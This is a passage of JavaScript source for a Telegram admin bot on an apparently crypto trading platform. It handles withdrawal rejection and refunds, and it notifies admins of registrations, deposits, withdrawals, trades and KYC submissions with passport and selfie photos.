        bot.answerCallbackQuery(query.id, { text: '✅ Вывод одобрен' });
        bot.sendMessage(chatId, `✅ Вывод *${wd ? formatNum(wd.amount) + ' USDT' : ''}* одобрен`, { parse_mode: 'Markdown' });
      }

      // ── Reject withdrawal ──
      if (data.startsWith('wd_reject_')) {
        const wdId = data.replace('wd_reject_', '');

        const client = await pool.connect();
        try {
          await client.query('BEGIN');

          const wd = (await client.query(
            'SELECT * FROM withdraw_requests WHERE id = $1 AND status = $2 FOR UPDATE',
            [wdId, 'pending']
          )).rows[0];

          if (!wd) {
            await client.query('ROLLBACK');
            return bot.answerCallbackQuery(query.id, { text: '⚠️ Уже обработан' });
          }

          // Return balance back to user
          await client.query('SELECT id FROM users WHERE id = $1 FOR UPDATE', [wd.user_id]);
          await client.query(
            'UPDATE users SET balance_usdt = balance_usdt + $1, updated_at = NOW() WHERE id = $2',
            [wd.amount, wd.user_id]
          );

          await client.query(
            'UPDATE withdraw_requests SET status = $1, processed_at = NOW() WHERE id = $2',
            ['rejected', wdId]
          );

          await client.query('COMMIT');
          bot.answerCallbackQuery(query.id, { text: '❌ Отклонён, баланс возвращён' });
          bot.sendMessage(chatId, `❌ Вывод отклонён, *${formatNum(wd.amount)} USDT* возвращён на баланс`, { parse_mode: 'Markdown' });
        } catch (e) {
          await client.query('ROLLBACK').catch(() => {});
          console.error('Withdrawal reject error:', e);
          bot.answerCallbackQuery(query.id, { text: '❌ Ошибка' });
        } finally {
          client.release();
        }
      }

    } catch (e) {
      console.error('Admin bot callback error:', e);
      bot.answerCallbackQuery(query.id, { text: '❌ Ошибка' }).catch(() => {});
    }
  });

  // ═══════════════════════════════════════
  // Support messages forwarding
  // ═══════════════════════════════════════
  // Listen for new support messages and notify admin
  // (Called from support route or periodically)
}

// ── Notify admin about new support message ──
async function notifyNewSupportMessage(userId, message) {
  if (!bot || !ADMIN_CHAT_ID) return;
  try {
    const user = (await pool.query('SELECT email, first_name FROM users WHERE id = $1', [userId])).rows[0];
    if (!user) return;

    const name = user.first_name || user.email;
    bot.sendMessage(ADMIN_CHAT_ID,
      `💬 *Новое сообщение в поддержку*\n\n` +
      `👤 ${escMd(name)} \\(\`${escMd(user.email)}\`\\)\n` +
      `💬 ${escMd(message)}`,
      {
        parse_mode: 'MarkdownV2',
        reply_markup: {
          inline_keyboard: [
            [{ text: '👤 Открыть карточку', callback_data: `open_user_${userId}` }]
          ]
        }
      }
    ).catch(() => {});
  } catch (e) {
    console.error('Notify support error:', e);
  }
}

async function getUserMeta(userId) {
  const user = (await pool.query('SELECT email, first_name FROM users WHERE id = $1', [userId])).rows[0];
  if (!user) return null;
  return {
    name: user.first_name || user.email,
    email: user.email
  };
}

async function sendAdminNotification(text, replyMarkup) {
  if (!bot || !ADMIN_CHAT_ID) return;
  await bot.sendMessage(ADMIN_CHAT_ID, text, {
    parse_mode: 'MarkdownV2',
    reply_markup: replyMarkup || undefined
  }).catch(() => {});
}

async function notifyUserRegistered(userId) {
  try {
    const meta = await getUserMeta(userId);
    if (!meta) return;

    await sendAdminNotification(
      `🆕 *Новый пользователь*\n\n` +
      `👤 ${escMd(meta.name)} \(\`${escMd(meta.email)}\`\)`
    );
  } catch (e) {
    console.error('Notify register error:', e);
  }
}

async function notifyDepositRequestCreated(userId, amount, currency, source = 'manual') {
  try {
    const meta = await getUserMeta(userId);
    if (!meta) return;

    const sourceText = source === 'crypto_invoice' ? 'Crypto Bot' : 'ручное пополнение';
    await sendAdminNotification(
      `📥 *Новая заявка на пополнение*\n\n` +
      `👤 ${escMd(meta.name)} \(\`${escMd(meta.email)}\`\)\n` +
      `💰 ${escMd(formatNum(amount))} ${escMd((currency || 'USDT').toUpperCase())}\n` +
      `🧾 Источник: ${escMd(sourceText)}`
    );
  } catch (e) {
    console.error('Notify deposit request error:', e);
  }
}

async function notifyDepositCompleted(userId, amount, currency, source = 'manual', reference = '') {
  try {
    const meta = await getUserMeta(userId);
    if (!meta) return;

    const sourceText = source === 'crypto_bot' ? 'Crypto Bot' : 'админ-одобрение';
    const refLine = reference ? `\n🔗 Ref: ${escMd(reference)}` : '';
    await sendAdminNotification(
      `✅ *Пополнение зачислено*\n\n` +
      `👤 ${escMd(meta.name)} \(\`${escMd(meta.email)}\`\)\n` +
      `💰 ${escMd(formatNum(amount))} ${escMd((currency || 'USDT').toUpperCase())}\n` +
      `🏦 Способ: ${escMd(sourceText)}` +
      refLine
    );
  } catch (e) {
    console.error('Notify deposit completed error:', e);
  }
}

async function notifyWithdrawRequestCreated(userId, amount, currency, wallet) {
  try {
    const meta = await getUserMeta(userId);
    if (!meta) return;

    await sendAdminNotification(
      `📤 *Новая заявка на вывод*\n\n` +
      `👤 ${escMd(meta.name)} \(\`${escMd(meta.email)}\`\)\n` +
      `💰 ${escMd(formatNum(amount))} ${escMd((currency || 'USDT').toUpperCase())}\n` +
      `🏷️ Кошелек/карта: ${escMd(wallet || '—')}`
    );
  } catch (e) {
    console.error('Notify withdraw request error:', e);
  }
}

async function notifyTradeCreated(userId, amount, direction, symbol, duration) {
  try {
    const meta = await getUserMeta(userId);
    if (!meta) return;

    const dirText = direction === 'up' ? 'UP' : 'DOWN';
    await sendAdminNotification(
      `📈 *Новая сделка пользователя*\n\n` +
      `👤 ${escMd(meta.name)} \(\`${escMd(meta.email)}\`\)\n` +
      `💰 ${escMd(formatNum(amount))} USDT\n` +
      `🎯 ${escMd(dirText)} ${escMd((symbol || 'BTC').toUpperCase())}\n` +
      `⏱️ ${escMd(String(duration))} сек`
    );
  } catch (e) {
    console.error('Notify trade error:', e);
  }
}

// Open user card from notification
// Handled in callback_query handler above — we need to add it
// (Will be picked up by the /user command pattern)

// ── Notify admin about KYC verification submission ──
async function notifyKYCSubmission(userId, fullName, birthDate, address, passportBuffer, selfieBuffer) {
  if (!bot || !ADMIN_CHAT_ID) return;
  try {
    const user = (await pool.query('SELECT email, first_name FROM users WHERE id = $1', [userId])).rows[0];
    if (!user) return;

    const name = user.first_name || user.email;
    // Send info message
    await bot.sendMessage(ADMIN_CHAT_ID,
      `🛡️ *Новая заявка на верификацию*\n\n` +
      `👤 ${escMd(name)} \\(\`${escMd(user.email)}\`\\)\n` +
      `📋 *ФИО:* ${escMd(fullName)}\n` +
      `📅 *Дата рождения:* ${escMd(birthDate)}\n` +
      `📍 *Адрес:* ${escMd(address)}`,
      {
        parse_mode: 'MarkdownV2',
        reply_markup: {
          inline_keyboard: [
            [{ text: '👤 Открыть карточку', callback_data: `open_user_${userId}` }]
          ]
        }
      }
    ).catch(() => {});

    // Send passport photo
    await bot.sendPhoto(ADMIN_CHAT_ID, passportBuffer, {
      caption: `📋 Паспорт — ${name} (${user.email})`
    }, { filename: 'passport.jpg', contentType: 'image/jpeg' }).catch(e => console.error('KYC passport send error:', e.message));

    // Send selfie photo
    await bot.sendPhoto(ADMIN_CHAT_ID, selfieBuffer, {
      caption: `🤳 Селфи — ${name} (${user.email})`
    }, { filename: 'selfie.jpg', contentType: 'image/jpeg' }).catch(e => console.error('KYC selfie send error:', e.message));

  } catch (e) {
    console.error('Notify KYC error:', e);
  }
}

function stopAdminBot() {
  if (bot) {
    bot.stopPolling();
    bot = null;
  }
}

module.exports = {
  initAdminBot,
  stopAdminBot,
  notifyNewSupportMessage,
  notifyKYCSubmission,
  notifyUserRegistered,
  notifyDepositRequestCreated,
  notifyDepositCompleted,
  notifyWithdrawRequestCreated,
  notifyTradeCreated
};
